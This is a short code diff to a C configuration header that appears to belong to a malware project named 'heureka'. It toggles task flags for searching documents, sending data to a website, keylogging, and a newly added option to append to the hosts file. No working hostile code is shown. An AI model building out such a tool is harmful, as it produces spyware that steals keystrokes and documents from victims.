@@ -11,6 +11,7 @@
 #define SEARCH_DOCS 1			// Task: Search for documents
 #define WEB_SEND_RECV 1			// Task: Send/Receive data to/from a website
 #define HOOK_KEYBOARD 1     // Task: Keylogger
+#define WRITE_HOSTS 0     // Task: Append hosts file
 #define IE_PATH "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 #define HEUREKADLL_PATH "Z:\\heureka\\heureka\\Release\\heurekadll.dll"
 
